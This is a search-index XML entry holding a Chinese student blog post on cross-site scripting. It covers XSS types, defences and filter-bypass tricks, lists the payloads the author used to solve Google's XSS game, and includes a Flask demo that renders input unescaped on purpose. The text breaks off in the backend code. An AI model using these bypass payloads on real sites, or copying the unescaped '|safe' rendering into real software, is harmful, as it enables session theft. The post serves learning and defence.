<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XSS Attack</title>
      <link href="/2020/04/12/XSS-Attack/"/>
      <url>/2020/04/12/XSS-Attack/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS 跨站脚本攻击"></a>XSS 跨站脚本攻击</h1><p>上节课，老师讲了有关XSS的攻击，我们便在这复习一波</p><blockquote><p>主要参考：</p><p>老师的ppt以及ctf-wiki</p><p><a href="https://www.google.com/about/appsecurity/learning/xss/index.html" target="_blank" rel="noopener">Google Security - XSS</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/" target="_blank" rel="noopener">ctf-wiki : XSS Cross-site Scripting Attack</a></p><p><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞(XSS)基础讲解</a></p><p><a href="https://tech.meituan.com/2018/09/27/fe-security.html" target="_blank" rel="noopener">前端安全系列（一）：如何防止XSS攻击？</a></p><p><a href="https://zhuanlan.zhihu.com/p/26177815" target="_blank" rel="noopener">浅谈XSS攻击的那些事（附常用绕过姿势）</a></p></blockquote><p>然后这边有一个在线的xss靶场：<a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">the XSS game</a></p><h3 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h3><p>什么是XSS：跨站脚本攻击，Cross-Site Scripting，为了和CSS(层叠样式表)区分开来，把第一个字母C改成了X，也就是现在所说的XSS攻击</p><p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是<strong>由于 WEB 应用程序对用户的输入过滤不足</strong>而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p><h3 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h3><p>XSS主要分为3种，分别是反射性XSS、持久性XSS(存储型XSS)、DOM XSS</p><ul><li><h4 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h4></li></ul><p>最经典的反射性XSS，就是我们在一个对话框里输入<code>&lt;script&gt;alert(&#39;Hello, XSS!&#39;)&lt;/script&gt;</code></p><p>然后跳出一个向你打招呼的XSS对话框</p><p>反射型 XSS 的攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li><li>用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。</p><p>由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XSS-Attack/Reflected-XSS.png" alt></p><p>如图，攻击者给出一个诱使你点进去的超链接（包含脚本）(1)，用户点进去该网站(2&amp;3)，服务器将该请求返回给用户，返回的页面形成victim’s browser里的内容，然后执行了脚本，将自身的cookie发送给攻击者</p><ul><li><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4></li></ul><p>存储型 XSS 的攻击步骤：</p><ol><li>攻击者将恶意代码提交到目标网站的数据库中。</li><li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。</li><li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、评论区、用户私信等。</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XSS-Attack/store-XSS.png" alt></p><p>如图，很简单的在一个评论区里，攻击者在评论区进行评论了一个脚本(1)，此时，服务器将这个脚本存储下来，并作为评论展示给每个用户。当其他用户浏览评论时(2&amp;3)，服务器将脚本返回给用户，用户加载给页面，即评论区的脚本时，将自身的cookie以get方式发给攻击者的网站(4)，此时攻击者就获得了用户的cookie</p><ul><li><strong>反射型 XSS 和存储型 XSS 的区别</strong>是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。</li></ul><ul><li><h4 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h4></li></ul><p>DOM 型 XSS 的攻击步骤：</p><ol><li>攻击者构造出特殊的 URL，其中包含恶意代码。</li><li>用户打开带有恶意代码的 URL。</li><li>用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。</li><li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li></ol><p>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p><h3 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h3><p>其实归根结底，XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码。</p><p>可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在XSS中除非恶作剧，不然是不会在恶意植入代码中写上alert（“say something”）的。</p><p>在真正的应用中，XSS攻击可以干的事情还有很多，这里举两个例子。</p><ul><li><h4 id="窃取网页浏览中的cookie值"><a href="#窃取网页浏览中的cookie值" class="headerlink" title="窃取网页浏览中的cookie值"></a>窃取网页浏览中的cookie值</h4></li></ul><p>在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。</p><p>如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到document.cookie。</p><p>试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过某些厂商的cookie有其他验证措施如：Http-Only保证同一cookie不能被滥用）</p><ul><li><h4 id="劫持流量实现恶意跳转"><a href="#劫持流量实现恶意跳转" class="headerlink" title="劫持流量实现恶意跳转"></a>劫持流量实现恶意跳转</h4></li></ul><p>这个很简单，就是在网页中想办法插入一句像这样的语句：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">window</span>.location.href=<span class="string">"http://www.baidu.com"</span>;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>那么所访问的网站就会被跳转到百度的首页。</p><p>早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。</p><h3 id="XSS漏洞防范"><a href="#XSS漏洞防范" class="headerlink" title="XSS漏洞防范"></a>XSS漏洞防范</h3><ul><li>过滤<br>服务器对输入内容进行过滤，对一些常用的标签(<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;a&gt;</code>)进行过滤，也有可能需要多次过滤以防绕过</li><li>输入输出编码<br>服务器对输入内容的一些常见符号进行编码，使得浏览器不会对标签进行解释执行</li><li>对内容长度进行限制<br>对于注入内容一般比较长的进行长度限制，因为达成XSS攻击一般需要较长的字符串，比如输入名字的时候，我们没必要开过长的数组</li></ul><p>作为用户，我们需要小心点击来源不明的URL，对浏览器进行安全加固，虽然大多差错是来源于服务器端的检查过滤不足导致的，但后果却是导致我们的信息丢失，因此作为用户我们也应当加以防范。</p><h3 id="XSS防范与绕过"><a href="#XSS防范与绕过" class="headerlink" title="XSS防范与绕过"></a>XSS防范与绕过</h3><p>安全总是在对抗中产生的，假如没有攻击，那么哪来的防范提升呢？正如老话：魔高一尺，道高一丈。只有在不断地攻击中，安全才能更胜一步。</p><p>既然XSS被发现，就会有人对他进行防范，既然有了防范，那么就会有人去想方设法的去绕过他</p><p>这里介绍一些经典的绕过方式</p><ul><li>大小写绕过</li><li>利用过滤后返回语句在此构成攻击语句来绕过（简称套娃）<br>比如：<code>http://192.168.1.102/xss/example3.php?name=&lt;sCri&lt;script&gt;pt&gt;alert(&quot;hey!&quot;)&lt;/scRi&lt;/script&gt;pt&gt;</code></li><li>并不是只有script标签才可以插入代码，比如<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;div&gt;</code>等等</li><li>编码脚本代码绕过关键字过滤</li><li>主动闭合标签实现注入代码</li><li>组合各种方式：就如同sql注入一样，XSS需要用心去构造0.0</li></ul><h2 id="XSS靶场通关构造"><a href="#XSS靶场通关构造" class="headerlink" title="XSS靶场通关构造"></a>XSS靶场通关构造</h2><blockquote><p><a href="https://blog.csdn.net/abc_12366/article/details/82054946" target="_blank" rel="noopener">https://blog.csdn.net/abc_12366/article/details/82054946</a></p></blockquote><p>1</p><p>输入框搞事情了</p><p><code>&lt;script&gt;alert(&#39;hello,XSS!&#39;)&lt;/script&gt;</code></p><p>2</p><p>评论区搞事情了</p><p><code>&lt;img src=&quot;nowhere&quot; onerror=&#39;alert(&quot;madness&quot;)&#39;&gt;</code></p><p>3</p><p>在url搞事情，这边我自己没注意，它使用<code>“”</code>表示字符串，<code>&#39;&#39;</code>表示标签里的字符串，没注意到卡了一会儿</p><p><code>https://xss-game.appspot.com/level3/frame#1&#39;/&gt;&lt;script&gt;alert(&#39;Hello,XSS!&#39;);&lt;/script&gt;&#39;</code></p><p>4</p><p>类似于一个计时器，但不过根据描述需要绕过，当然也就是在输入框搞事情了</p><p>js动态引用参数问题</p><p>输入<code>3&#39;</code>可以看到 <code>onload=&quot;startTime(&#39;3&#39;&#39;);&quot;</code></p><p>尝试输入<code>3&#39;);alert(&#39;hello,XSS!</code></p><p>5</p><p>这个可太刺激了，我竟然没发现能看源代码，亏我按F12看代码，在N次尝试下猜实现</p><p>输入转为链接过滤不严</p><p>看源代码按下面的<code>toggle</code></p><p>构造如下：<code>https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)</code></p><p>6</p><p>引入外部js，过滤不严导致绕过造成xss</p><p>#后面能访问到url所指的地方，比如将其替换为<code>baidu.com</code></p><p>所以这边写个简易的javascript脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>然后保存</p><p>用我们python3自带的简易服务器用于其url访问</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -m http.server 8000</span><br></pre></td></tr></table></figure><p>然后访问本地8000端口就可以看到本地文件了</p><p>然后构造url：<code>https://xss-game.appspot.com/level6/frame#HTTP://127.0.0.1:8000/temp.js</code></p><p>注意，题目js源码中有对http的过滤</p><p>当然也可以用google的jsapi：<code>https://xss-game.appspot.com/level6/frame#hTTps://google.com/jsapi?callback=alert</code></p><p>通关撒花</p><p><img src="https://magic-king.net/images/loading.gif" data-original="XSS-Attack/XSS-game_done.png" alt></p><p>最后通向了其XSS学习网站：<a href="https://www.google.com/about/appsecurity/learning/xss/index.html" target="_blank" rel="noopener">https://www.google.com/about/appsecurity/learning/xss/index.html</a></p><h2 id="构造一个XSS网站以及其对抗"><a href="#构造一个XSS网站以及其对抗" class="headerlink" title="构造一个XSS网站以及其对抗"></a>构造一个XSS网站以及其对抗</h2><p>通过上面的靶场练习已经很熟悉XSS的原理了</p><p>刚开始再用flask基本实现一个搜索功能时，发现无法XSS，后面经查询Flask和jinja2都有在传输时对数据进行html转义，但默认是Flask关闭html转义，jinja2开启html转义</p><blockquote><p>flask和其模板jinja2 禁用html转义</p><p><a href="https://blog.csdn.net/super_tiger_lee/article/details/77837443" target="_blank" rel="noopener">https://blog.csdn.net/super_tiger_lee/article/details/77837443</a></p><p><a href="https://www.jianshu.com/p/6950b616f2b7" target="_blank" rel="noopener">https://www.jianshu.com/p/6950b616f2b7</a></p><p>简单来说，在使用变量 <code></code> 利用jinja管道的方法，对 <code>var</code> 变量进行信任，而不进行html转义，即写为 <code></code></p></blockquote><p>在前后台传输数据遇到的问题：</p><blockquote><p>太久没写flask有点生疏，然后导致表单获取请求时一直为空，忘记啥原因了，这边mark一下</p><p>get请求表单通过<code>request.args.get(&#39;name&#39;)</code>获得</p><p>post请求表单通过<code>request.form.get(&#39;name&#39;)</code>获得</p></blockquote><ul><li>在评论时，防止get请求刷新后重复评论，需要用post去请求评论</li></ul><p>实现html转义，有html包提供的方法，但代码里我们可以直接仿造其写一个(其实很简单)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> html</span><br><span class="line">s = <span class="string">"&lt;script&gt;alert(1);&lt;/script&gt;"</span></span><br><span class="line">tran_s = html.escape(s)</span><br><span class="line">ret = html.unescape(tran_s)</span><br></pre></td></tr></table></figure><p>下面给出代码</p><p>前端部分</p><p>主要用jinja2模板写的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>fuckXSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">'text/css'</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">div &#123;</span></span><br><span class="line"><span class="undefined">    display: block;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">table &#123;</span></span><br><span class="line"><span class="undefined">    border-collapse: separate;</span></span><br><span class="line"><span class="undefined">    border-spacing: 2px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.message-container</span> &#123;</span></span><br><span class="line"><span class="undefined">    padding: 10px;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">background-color</span>: <span class="selector-id">#F9F9F9</span>;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#C4C4C4</span>;</span></span><br><span class="line"><span class="undefined">    border-radius: 5px 5px;</span></span><br><span class="line"><span class="undefined">    width: 400px;</span></span><br><span class="line"><span class="undefined">    font-size: 12px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">td &#123;</span></span><br><span class="line"><span class="undefined">    display: table-cell;</span></span><br><span class="line"><span class="undefined">    vertical-align: inherit;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.shim</span> &#123;</span></span><br><span class="line"><span class="undefined">    position: absolute;</span></span><br><span class="line"><span class="undefined">    margin-left: -20px;</span></span><br><span class="line"><span class="undefined">    top: 15px;</span></span><br><span class="line"><span class="undefined">    height: 21px;</span></span><br><span class="line"><span class="undefined">    width: 10px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">b &#123;</span></span><br><span class="line"><span class="undefined">    font-weight: bold;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">blockquote &#123;</span></span><br><span class="line"><span class="undefined">    display: block;</span></span><br><span class="line"><span class="undefined">    margin-block-start: 1em;</span></span><br><span class="line"><span class="undefined">    margin-block-end: 1em;</span></span><br><span class="line"><span class="undefined">    margin-inline-start: 40px;</span></span><br><span class="line"><span class="undefined">    margin-inline-end: 40px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">'text-align: center'</span>&gt;</span> 反射性XSS <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'text-align: center;</span></span></span><br><span class="line"><span class="tag"><span class="string">  margin: 0 auto;'</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">&#123;% if query %&#125;</span><br><span class="line">4<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/rxss"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">4  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"query"</span> <span class="attr">name</span>=<span class="string">"query"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123;query&#125;&#125;"</span>&gt;</span></span><br><span class="line">4  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">44anti-XSS<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"anti-XSS"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line">44<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">4  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Search"</span>&gt;</span></span><br><span class="line">4<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span>Your Search for &#123;&#123; query|safe &#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">4Unfortunately it has gone!<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">4<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/rxss"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">4  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"query"</span> <span class="attr">name</span>=<span class="string">"query"</span> <span class="attr">value</span>=<span class="string">"Enter query here..."</span>&gt;</span></span><br><span class="line">4  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">44anti-XSS<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"anti-XSS"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line">44<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">4  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Search"</span>&gt;</span></span><br><span class="line">4<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">'text-align: center'</span>&gt;</span> 持久性XSS <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'text-align: center;</span></span></span><br><span class="line"><span class="tag"><span class="string">  margin: 0 auto;'</span>&gt;</span></span><br><span class="line">4</span><br><span class="line"></span><br><span class="line">4<span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"pxss"</span> <span class="attr">action</span>=<span class="string">"pxss"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">4  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"qcomment"</span> <span class="attr">name</span>=<span class="string">"qcomment"</span> <span class="attr">value</span>=<span class="string">"Enter comment here..."</span> <span class="attr">onfocus</span>=<span class="string">"this.value=&amp;#39;&amp;#39;"</span>&gt;</span></span><br><span class="line">4  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">4anti-XSS<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"anti-XSS"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span></span><br><span class="line">4<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">4  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Comment"</span>&gt;</span></span><br><span class="line">4<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">4<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"post-container"</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"message"</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span> <span class="attr">class</span>=<span class="string">"message-container"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"shim"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>You<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"date"</span>&gt;</span>Sun Apr 12 2020 16:44:32 GMT+0800 (中国标准时间)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span>Welcome!<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>This is your <span class="tag">&lt;<span class="name">i</span>&gt;</span>personal<span class="tag">&lt;/<span class="name">i</span>&gt;</span> stream. You can post anything you want here, especially <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">"color: #f00ba7"</span>&gt;</span>madness<span class="tag">&lt;/<span class="name">span</span>&gt;</span>.<span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% if comment %&#125;</span><br><span class="line">&#123;% for comment_item in comment %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span> <span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">"top"</span> <span class="attr">class</span>=<span class="string">"message-container"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"shim"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>You<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">blockquote</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;comment_item | safe&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后端部分：</p><p>通过Python的Flask实现</p><p>通过路由来接收搜索和评论请求，把评论内容存储在一个数组里（毕竟是临时的，重启Flask应用即可清除评论）</p><p>XSS的对抗将输入进行html编码实现，勾选框即可启用</p><p>escape仿照了HTML包里面对于html编码的实现，利用python的字符串替代直接替换相关的html符号，实现html编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 